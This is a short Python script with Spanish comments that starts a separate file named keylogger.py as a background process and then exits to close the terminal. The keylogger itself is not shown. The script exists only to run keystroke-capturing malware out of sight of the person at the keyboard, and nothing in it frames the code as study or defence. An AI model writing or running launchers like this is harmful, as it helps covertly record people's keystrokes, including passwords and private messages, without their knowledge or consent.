import subprocess
import os
import sys

def run_keylogger():
    # Ruta al script del keylogger
    keylogger_script = os.path.join(os.path.dirname(__file__), 'keylogger.py')

    # Ejecutar el keylogger en segundo plano
    subprocess.Popen(['python3', keylogger_script])

    # Cerrar la terminal
    sys.exit(0)

if __name__ == "__main__":
    run_keylogger()